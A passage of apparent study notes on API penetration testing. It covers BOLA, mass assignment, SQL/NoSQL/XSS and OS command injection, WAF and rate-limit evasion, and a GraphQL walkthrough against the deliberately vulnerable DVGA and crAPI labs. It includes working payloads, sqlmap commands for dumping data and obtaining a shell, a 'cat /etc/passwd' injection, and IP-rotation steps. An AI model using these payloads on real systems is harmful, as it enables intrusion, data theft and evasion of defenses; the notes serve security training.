GET /identity/api/v2/vehicle/2e88a86c-8b3b-4bd1-8117-85f3c8b52ed2/location
Authorization: Bearer UserA-Token
```

```json
HTTP/1.1 200
{ "carId":"2e88a86c-...", "vehicleLocation":{"latitude":"37.233333","longitude":"-115.808333"}, "fullName":"Adam" }
```

### 🎯 Result

A single BOLA + a leaked GUID from an unrelated endpoint = **real-time vehicle tracking of any user** (one Google Maps lookup away from a precise location). 🚨

> 🔑 **Lesson:** chaining a **low-severity info leak** (excessive data exposure) with a **BOLA** can escalate into a serious privacy/tracking attack.

---

## ✅ Quick Summary

```
🔓 BOLA  → wrong DATA access     (same token, different resource ID)
🧩 BFLA  → wrong ACTION access   (same token, different privileged function/method)
🧪 A-B   → create as UserA, access as UserB (BOLA)
🧪 A-B-A → create/alter as UserB, VERIFY with UserA (BFLA)
📡 Side-channel → status codes/timing reveal resource existence without direct access
🚀 Scale → Postman Collection Runner + Burp Match & Replace to test token swaps broadly
⚠️ Caution → avoid mass DELETE fuzzing outside test environments
```

> 🔑 **Key idea:** look everywhere an ID, email, token, or group name appears (URL, body, headers) and ask: _"What happens if I swap this for someone else's?"_

# 🎯 Mass Assignment

> An API is vulnerable when it accepts **client input it shouldn't**, and blindly maps it to internal/sensitive variables — letting you update fields you were never meant to touch.

> 🏦 **Core idea:** you're allowed to update your email, but if the API doesn't filter input, you might sneak in `"balance": 999999` too.

---

## 🎯 1. Finding Mass Assignment Targets

Best hunting grounds: any endpoint that **accepts and processes client input**.

### 📝 Account Registration

```http
POST /api/v1/register
{ "username":"hAPI_hacker", "email":"hapi@hacker.com", "password":"Password1!" }
```

➡️ Try adding a likely privilege field:

```json
{ "username":"hAPI_hacker", "email":"hapi@hacker.com", "admin": true, "password":"Password1!" }
```

If the backend trusts this field → **instant admin account**. 👑

### 🏢 Unauthorized Access to Organizations

```json
{ "username":"hAPI_hacker", "email":"hapi@hacker.com", "org": "§CompanyA§", "password":"Password1!" }
```

➡️ Fuzz the `org` value (like BOLA testing) to jump into **other companies' data**.

💡 **Don't stop at registration** — also test: password reset, profile updates, group/company profile updates, and any endpoint accepting client input.

---

## 🔑 2. Finding Mass Assignment Variables

No consistency between APIs — you need to **discover the naming convention** your target uses.

### 📖 From Documentation

Compare a **normal user creation** request vs an **admin creation** request:

```json
// Standard user
POST /api/create/user
{ "username": "hapi_hacker", "pass": "ff7ftw" }

// Admin (different endpoint, different token, extra field)
POST /api/admin/create/user
{ "username": "adminthegreat", "pass": "bestadminpw", "admin": true }
```

➡️ Try adding `"admin": true` to the **regular** user endpoint:

```json
POST /create/user
Token: LowPriv-User
{ "username": "hapi_hacker", "pass": "ff7ftw", "admin": true }
```

### 🎲 Fuzzing Unknown Variables

Intercept a request with "bonus" fields you don't understand:

```json
{ "username":"hapi_hacker", "pass":"ff7ftw", "uam":1, "mfa":true, "account":101 }
```

➡️ Fuzz each one: `uam=0`, `mfa=false`, `account=0..101` — watch how responses change. Build a wordlist from every odd parameter you find across the API.

### 🙈 Blind Mass Assignment Attacks

No documentation, no clues? Throw **every guess at once**:

```json
{
  "username":"hAPI_hacker", "email":"hapi@hacker.com",
  "admin": true, "admin":1, "isadmin": true,
  "role":"admin", "role":"administrator", "user_priv": "admin",
  "password":"Password1!"
}
```

➡️ A vulnerable API may **ignore the junk fields** and accept the one that matches its real internal naming.

---

## 🤖 3. Automating with Arjun & Burp Intruder

### 🔍 Arjun (parameter discovery)

```bash
arjun --headers "Content-Type: application/json" \
  -u http://vulnhost.com/api/register -m JSON --include='{$arjun$}'
```

```
[+] Heuristic found a potential post parameter: admin
[+] Valid parameter found: user
[+] Valid parameter found: pass
[+] Valid parameter found: admin
```

💡 Rate limited? Add `--stable` to slow down the scan.

### 💥 Burp Intruder (cycling through candidates)

If the API rejects **oversized requests** (`400`, `401`, `413 Payload Too Large`), test one field at a time instead:

```http
POST /api/v1/register
{
  "username":"hAPI_hacker",
  "email":"hapi@hacker.com",
  §"admin": true§,
  "password":"Password1!"
}
```

→ Mark the field as the **attack position** and cycle through a payload list of likely variable names/values.

---

## 🧩 4. Combining BFLA + Mass Assignment

A limited BFLA (e.g. can only edit username/address/city) becomes **much worse** when combined with mass assignment.

### 🎮 Example: Ash vs. Brock

Ash found a BFLA letting him edit **basic profile fields** of other users:

```json
PUT /api/v1/account/update
{ "username":"Ash", "address":"123 C St", "city":"Pallet Town", "region":"Kanto" }
```

By noticing `email` and `mfa` fields elsewhere in the API, Ash escalates:

```json
PUT /api/v1/account/update
Token: UserA-Token
{
  "username":"Brock", "address":"456 Onyx Dr", "city":"Pewter Town", "region":"Kanto",
  "email":"ash@email.com", "mfa": false
}
```

➡️ Then Ash triggers a **password reset** (`/api/v1/account/reset`) → the temp password goes to **his own email** → MFA disabled → **full account takeover** of Brock. 🚨

> 🔑 **Lesson:** always think like an adversary — chain a "minor" BFLA with mass assignment for full account compromise.

---

## 🧪 Lab #8: Changing the Price of Items in an Online Store (crAPI)

### 🎯 Candidate endpoints with client input

```
POST /identity/api/auth/signup
POST /workshop/api/shop/orders
POST /workshop/api/merchant/contact_mechanic
```

### 🪜 Steps

**1️⃣ Spot an interesting variable** `GET /workshop/api/shop/products` response includes a `"credit"` field. 💰

**2️⃣ Test other HTTP methods on the same endpoint (Burp Intruder)**

```
§GET§ /workshop/api/shop/products HTTP/1.1
```

Payloads: `PUT, POST, HEAD, DELETE, CONNECT, PATCH, OPTIONS`

**Results:**

- Most methods → `405 Method Not Allowed`
- `POST` → `400 Bad Request` ⚠️ (meaning: the endpoint **exists** for POST but is missing required fields — and the API **tells you what they are**)

**3️⃣ Craft a valid POST (create a product + inject `credit`)**

```http
POST /workshop/api/shop/products
Authorization: Bearer UserA-Token
{ "name":"TEST1", "price":25, "image_url":"string", "credit":1337 }
```

✅ `200 OK` — item created in the store. ⚠️ But `credit` field had **no direct effect** on balance (it's deducted normally on purchase, as expected).

**4️⃣ Think adversarially — exploit `price` instead**

```http
POST /workshop/api/shop/products
Authorization: Bearer UserA-Token
{ "name":"MassAssignment SPECIAL", "price":-5000,
  "image_url":"https://example.com/chickendinner.jpg" }
```

✅ `200 OK` → item created with a **negative price**.

**5️⃣ Purchase it** ➡️ Buying a **-5000** priced item **adds $5,000 credit** to the account instead of charging it. 🤑

### 🎯 Root cause

Unrestricted `POST /workshop/api/shop/products` = **BFLA** (a regular user shouldn't manage store products) **combined with mass assignment** (arbitrary `price`/fields accepted) → **financial exploit**.

---

## ✅ Quick Summary

```
📝 Registration     → try adding admin/isAdmin/role fields
🏢 Org access       → fuzz org/company ID fields
📖 Docs             → compare normal vs admin request bodies
🎲 Unknown fields   → fuzz suspicious extras (uam, mfa, account...)
🙈 Blind attack     → throw every guessed field name at once
🤖 Arjun            → automated parameter discovery
💥 Intruder         → cycle fields one at a time (avoids payload-size limits)
🧩 BFLA + mass assign → edit someone else's account + inject privileged fields = takeover
🧪 Lab: crAPI        → negative price product = free credits 💸
```

> 🔑 **Key idea:** mass assignment is rarely "just" mass assignment — it's often the multiplier that turns a small BFLA or excessive-exposure finding into full account or financial compromise.

# 💉 Injection

> Injection = sending input that gets **directly executed** by the API's supporting technology (DB, OS, browser), bypassing input validation. Named after the target: **SQLi, NoSQLi, XSS, XAS, OS command injection.**

---

## 🔎 1. Discovering Injection Vulnerabilities

### 🎯 Where to test

```
🔑 API keys    🎫 Tokens    🏷️ Headers
🔗 Query strings    📦 POST/PUT body parameters
```

### 🧭 Approach

- Less info about the target → **broad, noisy fuzzing**
- More info (DB type, OS, language) → **targeted payloads**

### 🚩 What to look for in responses

- Verbose errors ("SQL Syntax Error")
- Unexpected delays (timing clue)
- Full error dumps (jackpot — leaks host details)

💡 **Pattern:** if `/file/upload` is vulnerable, test **every similar endpoint** (`/image/upload`, `/account/upload`...) — they often share the same flaw.

⚠️ These attacks are **decades old** — defenders know them well, so expect strong protections and test many variations.

---

## 🎭 2. Cross-Site Scripting (XSS)

Malicious script injected via input, executed in **another user's browser**.

### 🧪 Sample payloads

```html
<script>alert("xss")</script>
<script>alert(1);</script>
<%00script>alert(1)</%00script>
SCRIPT>alert("XSS");///SCRIPT>
```

💡 Small tricks like a **null byte** (`%00`) or **mixed case** can bypass filters.

### ⚠️ Conditions to succeed

- The API's data **ends up rendered in a browser** (no browser interaction = no XSS)
- Input isn't sanitized

### 🎯 Good target requests

```
✏️ Updating user profile info
👍 Updating social media "like" info
🛒 Updating ecommerce store products
💬 Posting to forums/comments
```

### 📚 Payload resources

- **Payload Box XSS list** (2,700+ scripts) — github.com/payloadbox/xss-payload-list
- **Wfuzz wordlist** — quick check
- **NetSec.expert XSS payloads** — explains each payload's use case

---

## 🔗 3. Cross-API Scripting (XAS)

XSS, but the injected script comes through a **third-party API integration** rather than direct user input.

> 🧩 Example: a blog sidebar pulls a LinkedIn feed via API. If LinkedIn content isn't sanitized, a malicious LinkedIn post could execute as a script **on the blog**.

### ⚠️ Conditions (harder than plain XSS)

- Poor sanitization of **API-sourced** data (own API or third-party)
- The injected content must be **rendered** in a way that triggers execution
- Third-party APIs may **rate-limit** your testing

### 💉 Example payload via API field

```http
POST /api/profile/update HTTP/1.1
Authorization: hAPI.hacker.token
Content-Type: application/json

{ "fname":"hAPI", "lname":"Hacker", "city":"<script>alert(\"xas\")</script>" }
```

➡️ If accepted, **load the page in a browser** to check execution.

💡 **Tip:** try changing `Content-Type: application/json` → `Content-Type: text/html` to coax the server into accepting an HTML payload.

> 🔑 Teams often protect the **web UI** against XSS but overlook the **API** as a separate entry point for the same payload.

---

## 🗄️ 4. SQL Injection

Interacts with the backend **SQL database** — can leak/delete data or bypass auth.

⚠️ Well-known and well-defended over APIs. Sending obvious SQLi payloads may **alert the security team** or get your token **banned**.

### 🎯 "Request the unexpected" technique

If Swagger docs say:

```
"id": number    "name": string    "is_admin": boolean
```

➡️ Send a **string where a number is expected**, a **huge number** where a small one is expected, etc. — triggers unhandled errors that leak DB info.

### 🔤 Manual metacharacters

```sql
'       ''      ;%00     --      -- -
""      ;       ' OR '1
' OR 1 -- -      " OR "" = "
" OR 1 = 1 -- -  ' OR '' = '
OR 1=1
```

### 🔓 Classic auth bypass example

Backend query:

```sql
SELECT * FROM userdb WHERE username = 'hAPI_hacker' AND password = 'Password1!'
```

Payload as password: `' OR 1=1-- -`

```sql
SELECT * FROM userdb WHERE username = 'hAPI_hacker' OR 1=1-- -
```

➡️ `--` comments out the rest → password check **skipped entirely** → access granted.

### 🤖 SQLmap (automation)

```bash
# Target a specific parameter from a saved Burp request
sqlmap -r /home/hapihacker/burprequest1 -p password

# Dump everything
sqlmap -r /home/hapihacker/burprequest1 -p vuln-param --dump-all

# Dump a specific table/column
sqlmap -r /home/hapihacker/burprequest1 -p vuln-param --dump -T users -C password -D helpdesk

# Try to get an OS shell
sqlmap -r /home/hapihacker/burprequest1 -p vuln-param --os-shell

# Try Meterpreter/VNC shell
sqlmap -r /home/hapihacker/burprequest1 -p vuln-param --os-pwn
```

💡 `-p` targets one parameter; without it SQLmap tests all (slower). **CTRL+C** → `n` to skip a parameter mid-scan.

---

## 📄 5. NoSQL Injection

Common in APIs (NoSQL scales well with API architectures) and **less well-known** than SQLi → **higher chance of success**. ⚠️ No shared structure across NoSQL DBs — payloads vary.

### 🔤 Common NoSQL metacharacters

```
$gt          {"$gt":""}        {"$gt":-1}
$ne          {"$ne":""}        {"$ne":-1}
$nin         {"$nin":1}        {"$nin":[1]}
|| '1'=='1   //                ||'a'\\'a
'||'1'=='1';//    '/{}:        '"\;{}
'"\/$[].>    {"$where": "sleep(1000)"}
```

|Operator|Meaning|
|---|---|
|`$gt`|Greater than|
|`$ne`|Not equal|
|`$nin`|"Not in" a given array|

### 🧪 Detecting it

Normal failed login (Pixi example):

```json
HTTP/1.1 202 Accepted
{"message":"sorry pal, invalid login"}
```

Fuzzed with `'"\;{}` as password:

```json
HTTP/1.1 400 Bad Request
SyntaxError: Unexpected token ; in JSON at position 54...
```

➡️ A **different, verbose** response = the input is being parsed oddly → good injection candidate.

### 🎯 Auth bypass example

```
user=hapi%40hacker.com&pass=§Password1%21§
```

Replacing the password attack position with `{"$gt":""}` or `{"$ne":""}` → **successful authentication bypass**. 🔓

---

## 💻 6. Operating System Command Injection

Inject OS commands via a **command separator**.

### 🔗 Command separators

```
|   ||   &   &&   '   "   ;   '"
```

### 🖥️ Useful OS commands

|Windows|*nix (Linux/Unix)|
|---|---|
|`ipconfig`|`ifconfig`|
|`dir`|`ls`|
|`ver`|`uname -a`|
|`echo %CD%`|`pwd`|
|`whoami`|`whoami`|

### 🎲 Wfuzz with two payload positions

```bash
wfuzz -z file,wordlists/commandsep.txt -z file,wordlists/os-cmds.txt \
  http://vulnerableAPI.com/api/users/query?=WFUZZWFUZ2Z
```

💡 In Burp: use **Intruder → Cluster Bomb** with 2 payload sets (separators × commands).

🎯 Goals once confirmed: read `/etc/shadow`, grab SSH keys, or escalate to a **full remote shell** (at that point it's "regular" post-exploitation hacking).

📚 **Further reading:** RTFM (Ben Clark), _Penetration Testing_ (Weidman), _Ethical Hacking_ (Graham), _Advanced Penetration Testing_ (Allsop), _Hands-On Hacking_ (Arcuri & Hickey), _The Hacker Playbook 3_ (Kim), _The Shellcoder's Handbook_ (Anley et al.)

---

## 🧪 Lab #9: Faking Coupons Using NoSQL Injection (crAPI)

**Target:** the coupon code feature (Shop tab → Add Coupon).

### 🪜 Steps

**1️⃣ Capture a baseline request**

```http
POST /community/api/v2/coupon/validate-coupon
Authorization: Bearer Hapi.hacker.token
{"coupon_code":"TEST!"}
```

→ Invalid code → "invalid coupon code".

**2️⃣ First Intruder attempt (all SQL/NoSQL payloads)** All results → same `500` status, same response length (385). Nothing anomalous... **yet**.

**3️⃣ Inspect encoding**

```
{"coupon_code":"%7b$where%22%3a%22sleep(1000)%22%7d"}
→ 500 Internal Server Error, {}
```

➡️ Payload was **URL-encoded**, breaking the injection. **Fix:** uncheck URL-encoding in Intruder's Payloads tab.

**4️⃣ Retry without encoding**

```
{"coupon_code":"{"$nin":[1]}"}"
→ 422 Unprocessable Entity
{"error":"invalid character '$' after object key:value pair"}
```

➡️ Progress! But the payload position was placed **inside** the original quotes, breaking nested-object syntax.

**5️⃣ Fix the attack position — include the quotes**

```
{"coupon_code":§"TEST!"§}
```

**6️⃣ Re-run Intruder** → two **200 OK** responses:

```
{"$gt":""}
{"$nin":[1]}
```

✅ The `$nin` ("not in") payload returned a **valid coupon code** — successful NoSQL injection!

### 🎯 Lesson

The vulnerability was there from the start, but **encoding and payload-position mistakes masked it**. Always double-check how your payload is actually transmitted and parsed.

---

## ✅ Quick Summary

```
🔎 Discovery    → fuzz keys/tokens/headers/query/body, watch for verbose errors
🎭 XSS          → <script> payloads, needs browser rendering of unsanitized input
🔗 XAS          → XSS via a 3rd-party/own API feed, harder conditions
🗄️ SQLi         → ' OR 1=1-- -, "request the unexpected", SQLmap for automation
📄 NoSQLi       → $gt / $ne / $nin operators, often less defended than SQL
💻 OS injection → | ; && separators + os commands (ipconfig/ls/whoami...)
🧪 Lab (crAPI)  → NoSQL injection in coupon_code field, fix URL-encoding + attack position
```

> 🔑 **Key idea:** injection techniques are decades old, but APIs are a **new delivery channel** for them. NoSQL is less understood by defenders than SQL — worth extra attention. When a first attempt fails, check **encoding** and **payload placement** before giving up.
# 🥷 Evasive Techniques & Rate Limit Testing

> Techniques to bypass **WAFs, input validation, and rate limiting** — then apply them specifically to test rate limits.

---

## 🛡️ 1. How Security Controls Work

A **WAF** inspects traffic against thresholds and reacts to abnormal activity.

### 🚩 Common WAF triggers

```
🔢 Too many requests for nonexistent resources
⏱️ Too many requests in a short time
💉 Known attack patterns (SQLi, XSS)
🧪 Abnormal behavior (authorization probing)
```

### 🎯 Attribution

Since REST is **stateless**, the WAF must identify "who you are" from the request itself:

```
📍 IP address    🏷️ Origin headers    🎫 Auth tokens    📊 Metadata (request rate/patterns)
```

💡 In **white/gray box** tests, prefer requesting **direct API access** so you test the API, not the WAF. Evasion techniques shine most in **black box** testing.

---

## 🔍 2. Detecting Security Controls

⚠️ Don't attack blindly first — you risk an immediate ban with no useful data. **Map the API as a valid user first.**

### 🏷️ Headers that reveal a CDN/WAF

```
X-CDN: Imperva / Served-By-Zenedge / fastly / akamai / Incapsula
X-Kong-Proxy-Latency: 123
Server: Zenedge / Kestrel
X-Zen-Fury
X-Original-URI
```

💡 A `302` redirecting you to a CDN is another tell.

### 🔧 Detection tools

```bash
nmap -p 80 --script http-waf-detect http://hapihacker.com
```

Also: **W3af**, **Wafw00f**, **Bypass WAF** (Burp extension).

---

## 🔥 3. Burner Accounts

Disposable accounts/tokens for safer testing.

✅ **Best practices:**

- Use **unrelated** info (different names/emails per account) — don't let a defender link them
- Consider a **VPN/proxy** to mask your IP during registration
- Goal: **avoid needing them** by evading detection cleanly in the first place

---

## 🥷 4. Evasive Techniques

### 🔤 String Terminators

Null bytes/symbols that **end a string early** — can bypass filters that stop processing after them.

```
%00   0x00   //   ;   %   !   ?   []   %5B%5D   %09   %0a   %0b   %0c   %0e
```

**Example XSS bypass:**

```json
{ "uname": "<s%00cript>alert(1);</s%00cript>", "email": "hapi@hacker.com" }
```

📚 Wordlists: **SecLists** metacharacters list, **Wfuzz** bad characters list. ⚠️ Test slowly across burner accounts in well-defended environments.

### 🔠 Case Switching

Some filters are case-sensitive and dumb:

```html
<sCriPt>alert('supervuln')</scrIpT>
```

```sql
SeLeCT * RoM all_tables
sELecT @@vErSion
```

### 🔐 Encoding Payloads

WAFs may block raw characters but **miss encoded versions**. Burp's **Decoder** module helps.

**Target characters:** `< > ( ) [ ] { } ; ' / \ |`

```
%3cscript%3ealert%28%27supervuln%27%29%3c%2fscript%3e
%3c%73%63%72%69%70%74%3ealert('supervuln')%3c%2f%73%63%72%69%70%74%3e
```

💡 **Double-encoding** can bypass a WAF that decodes once, then slip through to the backend's second decode pass.

---

## 🤖 5. Automating Evasion

### 🦊 Burp Suite — Intruder Payload Processing

Rules applied **top to bottom** before sending. Example: wrap payload in null bytes after URL-encoding.

1. **Encode rule** → URL-Encode All Characters
2. **Add Prefix rule** → `%00`
3. **Add Suffix rule** → `%00`

Result:

```
POST /api/v3/user?id=%00%75%6e%64%65%66%69%6e%65%64%00
```

### 🎲 Wfuzz Encoders

```bash
wfuzz -e encoders                              # list all encoders
wfuzz -z file,wordlist/api/common.txt,base64 http://hapihacker.com/FUZZ
```

|Encoder|Does|
|---|---|
|`base64`|Base64 encode|
|`urlencode`|`%xx` escaping|
|`random_upper`|Random capitalization|
|`md5`|MD5 hash|
|`hexlify`|Hex representation|
|`none`|No change|

**Multiple encoders, separate requests (`-`):**

```bash
wfuzz -z list,a,base64-md5-none      # 3 separate requests: base64 / md5 / plain
```

**Chained encoders, same request (`@`):**

```bash
wfuzz -z list,aaaaa-bbbbb-ccccc,base64@random_upper -u http://target/FUZZ
# → random_upper applied FIRST, then base64 — one request per payload
```

📚 More: **Awesome-WAF** GitHub repo (github.com/0xInfection/Awesome-WAF)

---

## 🚦 6. Testing Rate Limits

Rate limiting prevents resource abuse/DoS and enables **API monetization**.

### 🔍 Identifying the limit

- Check **docs/marketing materials** first
- Check headers: `x-rate-limit`, `x-rate-limit-remaining`
- Watch for `429 Too Many Requests` + `Retry-After:` header

Attribution for rate limiting relies on: **IP address + auth token** (same weak points as WAFs).

### 🐌 Lax Rate Limits (no bypass needed)

If the limit is generous enough (e.g. 15,000/min to brute-force 150,000 passwords in 10 min), just **throttle your tool** to stay under it.

**Wfuzz throttling:**

```bash
-t <concurrent connections>
-s <delay between requests in seconds>
```

|Delay (s)|Approx. rate|
|---|---|
|0.01|10/sec|
|1|1/sec|
|6|10/min|
|60|1/min|

**Burp Intruder (Pro) — Resource Pool** (delay in **milliseconds**):

|Delay (ms)|Approx. rate|
|---|---|
|100|10/sec|
|1000|1/sec|
|6000|10/min|
|60000|1/min|

💡 If exceeding the limit causes **no consequence**, that itself is a **vulnerability finding**.

---

### 🛣️ Path Bypass

Slightly alter the URL — may reset or dodge rate limiting entirely.

```
POST /api/myprofile%00
POST /api/myprofile%20
POST /api/myProfile
POST /api/MyProfile
POST /api/my-profile
POST /api/myprofile?test=1
```

💡 If adding a meaningless parameter resets the limit, **fuzz its value** too — then pair it with your real attack position using **Burp Intruder's Pitchfork** (same payload pattern for both positions) to minimize total requests.

### 🏷️ Origin Header Spoofing

```
X-Forwarded-For   X-Forwarded-Host   X-Host
X-Originating-IP  X-Remote-IP        X-Client-IP   X-Remote-Addr
```

Try values like private IPs, `127.0.0.1`, or IPs from the target's own attack surface.

⚠️ Sending **all headers at once** can trigger `431 Request Header Fields Too Large` → send fewer at a time.

💡 Also rotate the **User-Agent** header (SecLists has a dedicated wordlist: `Fuzzing/User-Agents/UserAgents.fuzz.txt`).

✅ **Success signs:** `x-rate-limit` resets, or requests succeed again after being blocked.

### 🌍 Rotating IP Addresses (Burp's IP Rotate extension)

Proxies traffic through the **AWS API Gateway**, cycling real AWS IPs per request — not spoofing, **actually different source IPs**.

#### 🪜 Setup

```bash
pip3 install boto3
# Download Jython standalone from jython.org/download.html
```

1. Burp → Extender → Options → set **Jython** standalone jar as Python Environment
2. Extender → BApp Store → install **IP Rotate**
3. AWS Console → IAM → **Add User** (programmatic access)
4. Attach policies: **AmazonAPIGatewayAdministrator** + **AmazonAPIGatewayInvokeFullAccess**
5. Download the CSV with **access key + secret key**
6. Burp → IP Rotate module → paste keys → **Save Keys**
7. Set target host (no protocol) → choose HTTP/HTTPS via Target Protocol → **Enable**

💡 **Test it:** target `ipchicken.com` and refresh — watch your "IP" change on each request.

💰 Small AWS cost applies.

---

## ✅ Quick Summary

```
🛡️ WAF detection    → headers (X-CDN...), nmap http-waf-detect, Wafw00f
🔥 Burner accounts   → disposable identities, unlinked info, maybe VPN
🔤 String terminators → %00 and friends to break filters
🔠 Case switching    → <sCriPt> bypasses naive filters
🔐 Encoding          → URL/HTML/base64, even double-encoding
🤖 Automation        → Burp Payload Processing / Wfuzz encoders (- vs @)
🚦 Rate limit ID     → docs, x-rate-limit headers, 429 + Retry-After
🐌 Lax limits        → just throttle (Wfuzz -s/-t, Burp Resource Pool)
🛣️ Path bypass       → tweak URL casing/terminators/dummy params
🏷️ Header spoofing   → X-Forwarded-For, User-Agent rotation
🌍 IP Rotate         → real rotating AWS IPs via Burp extension
```

> 🔑 **Key idea:** security controls depend on **attribution** (IP, token, headers, metadata). Find a gap in how the provider attributes requests, and you can slip past WAFs and rate limits alike.

# 🔮 Attacking GraphQL (DVGA Walkthrough)

> Full hands-on attack of **Damn Vulnerable GraphQL Application (DVGA)**: recon → reverse engineering → analysis → exploitation.

---

## 1️⃣ GraphQL Requests & IDEs — Recap

GraphQL is closer to **SQL** than REST — it's query-centric.

```graphql
POST /v1/graphql
query products (price: "10.00") {
  name
  price
}
```

```json
200 OK
{ "data": { "products": [
  {"product_name":"Seat","price":"10.00"},
  {"product_name":"Wheel","price":"10.00"}
]}}
```

### 🔑 Key differences from REST

|🌿 REST|🔮 GraphQL|
|---|---|
|Many endpoints|**ONE** endpoint, always `POST`|
|GET/POST/PUT/DELETE for CRUD|**query** (read) / **mutation** (create/update/delete) / **subscription** (real-time)|
|Varied status codes (200/400/401/404...)|Usually **always 200 OK**, even on errors — errors live **in the response body**|
|No built-in UI|Often ships a **GraphQL IDE**: GraphiQL, GraphQL Playground, Altair Client|

💡 A query can combine **query + mutation** in a single request (read + write together).

---

## 2️⃣ Active Reconnaissance

### 🔭 Nmap

```bash
nmap -sC -sV 192.168.195.132
```

```
5000/tcp open  http  Werkzeug httpd 1.0.1 (Python 3.7.12)
|_http-title: Damn Vulnerable GraphQL Application
```

➡️ `http-title` reveals GraphQL (rare in real-world targets, but useful here).

### 🔎 Nikto

```bash
nikto -h 192.168.195.132:5000
```

Findings: missing `X-Frame-Options`, undefined `X-XSS-Protection`, missing `X-Content-Type-Options`, allowed methods `OPTIONS, HEAD, GET`. No juicy directories found → time to browse manually.

### 🌐 Manual browsing

Explore: **Private Pastes, Public Pastes, Create Paste, Import Paste, Upload Paste**. Collect: usernames, IPs, user-agents in posts, upload/forum links.

### 🔍 DevTools

- Home page → Network tab → response header: `Set-Cookie: env=graphiql:disable` 🍪 (hints at a disabled GraphiQL IDE)
- Public Pastes page → Network tab → a `graphql` resource appears → Preview tab shows **JSON** → confirms GraphQL backend

---

## 3️⃣ Reverse Engineering the GraphQL API

### 🗂️ Directory brute-force for the endpoint

Common paths to try manually or via wordlist:

```
/graphql  /v1/graphql  /api/graphql  /v1/api/graphql
/graph    /v1/graph    /graphiql     /v1/graphiql
/console  /query       /graphql/console
/altair   /playground
```

💡 Also try `/v2`, `/v3`, `/test`, `/internal`, `/mobile`, `/legacy` variants.

**Kiterunner + SecLists:**

```bash
kr brute http://192.168.195.132:5000 -w /usr/share/seclists/Discovery/Web-Content/graphql.txt
```

```
GET 400  /graphiql
GET 400  /graphql
```

- `/graphql` → `"Must provide query string"` (expected — no query sent yet)
- `/graphiql` → `"400 Bad Request: GraphiQL Access Rejected"` 🚫

### 🍪 Cookie Tampering to Enable GraphiQL

1. Intercept `GET /graphiql` in Burp → find `Cookie: env=Z3JhcGhpcWw6ZGlzYWJsZQ==`
2. **Decoder** → base64 decode → `graphiql:disable`
3. Change to `graphiql:enable`, re-encode to base64
4. In browser DevTools → **Application/Storage** panel → edit the `env` cookie value directly
5. Refresh `/graphiql` → **GraphiQL IDE + Documentation Explorer now accessible** ✅

### 🔎 Reverse Engineering via Postman

- Proxy browser traffic to Postman, click through **every** feature of the app
- Clean up the captured collection: delete anything NOT hitting `/graphiql` or `/graphql`
- Since all requests share the same endpoint, **inspect each request body** to tell them apart, then **rename** based on distinguishing details (e.g. "Graphiql Query Introspection SubscriptionType" vs "...Types")

### 🕵️ Introspection (schema disclosure)

**Introspection** = a built-in GraphQL query that reveals the **entire schema** — a goldmine (often disabled in production).

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives { name description locations args { ...InputValue } }
  }
}
```

💡 GraphiQL automatically sends this when loading the Documentation Explorer — just intercept it to get the full query, or grab it from the Hacking APIs GitHub repo.

---

## 4️⃣ GraphQL API Analysis

### 🏗️ Crafting a query in GraphiQL (Documentation Explorer)

```graphql
query {
  pastes (public: true) {
    title
    content
    public
    ipAddr
    pId
  }
}
```

Run with **Execute Query** button or **CTRL+Enter**. Response includes exactly the requested fields.

### 🧩 InQL Burp Extension (when no GraphiQL IDE exists)

- Requires **Jython** set up in Extender (same as Chapter 13's IP Rotate)
- **InQL Scanner** → feed it the GraphQL URL → it auto-discovers queries/mutations and saves them for use in Repeater/Intruder

### 🔓 BOLA via `paste.query`

Query pastes by `pID` (sequential IDs):

```graphql
paste.query(pId: 166)
```

```json
{"data":{"paste":{"pId":"166","title":"test3","content":"testy","public":true,...}}}
```

➡️ Send to **Intruder**, fuzz `pID` from 0–166:

```json
{"pId":"63","title":"Imported Paste from URL - b9ae5f","public":false, ...}
```

🚨 **BOLA confirmed** — `"public": false` pastes (private data) retrieved without authorization, just by brute-forcing sequential IDs.

---

## 5️⃣ Fuzzing for Command Injection

⚠️ GraphQL complicates fuzzing: **almost everything returns 200 OK**, even malformed requests. You must build a **baseline** (response length/content) and watch for subtler anomalies.

Since `query` is read-only, target **mutations** instead.

### 🎯 Target: `ImportPaste` mutation

```json
{"query":"mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {...}",
 "variables": {"host":"google.com","port":80,"path":"/","scheme":"http"}}
```

➡️ The `variables` block carries **user input** — ideal fuzzing target.

### 🧪 Attack setup (Burp Intruder, cluster bomb style)

```json
"variables": {"host":"google.com§test§§test2§","port":80,"path":"/","scheme":"http"}
```

**Payload set 1 (command separators):**

```
|   ||   &   &&   '   "   ;   '"
```

**Payload set 2 (injection payloads):**

```
whoami
{"$where": "sleep(1000)"}
;%00
-- -
```

(Disable payload encoding.)

### 📊 Results

|Target variable|Result|
|---|---|
|`host`|❌ Uniform status codes/lengths — nothing interesting|
|`path`|✅ **Varied codes/lengths**, and `whoami` command **executed successfully** — response revealed user **`root`** on a **Linux** host|

### 💥 Exploiting the OS command injection

```json
{"variables": {"scheme":"http","path":"/ ; cat /etc/passwd","port":80,"host":"test.com"},
 "query":"mutation ImportPaste (...) { importPaste(...) { result } }"}
```

```
HTTP/1.0 200 OK
{"data":{"importPaste":{"result":"...root:x:0:0:root:/root:/bin/ash\n..."}}}
```

🎉 **Full `/etc/passwd` dumped** — command injection confirmed, running as **root**.

➡️ From here: enumerate further, or pivot to a full reverse shell.

---

## ✅ Quick Summary

```
🔮 GraphQL basics   → 1 endpoint, always POST, query/mutation, usually 200 OK always
🔭 Recon            → nmap/nikto + manual browsing + DevTools (env cookie, graphql source)
🗂️ Endpoint discovery → brute-force /graphql, /graphiql, /playground, /altair paths
🍪 Cookie tampering  → base64 decode/edit env cookie to enable GraphiQL IDE
🕵️ Introspection     → __schema query reveals the FULL API schema
🧩 InQL extension    → Burp's GraphQL scanner when no IDE is exposed
🔓 BOLA              → fuzz sequential pId values → leak private pastes
💉 Command injection → fuzz mutation "variables" (not query!), target path/host fields
🎯 Result            → whoami → root → cat /etc/passwd → full file disclosure
```

> 🔑 **Key idea:** GraphQL needs adapted technique (single endpoint, body-based requests, mutation vs query, baseline-dependent fuzzing since status codes don't help) — but the underlying attack classes (BOLA, injection) are exactly the same as REST.

# 💥 Data Breaches & Bug Bounties

## 🚨 THE BREACHES

### 🚴 Peloton (early 2021)

**3M+ subscribers** — user IDs, location, age, gender, weight, workout data. Found by researcher **Jan Masters**. Notable: Joe Biden owned a Peloton at the time.

Three unauthenticated attack paths:

|Method|How|
|---|---|
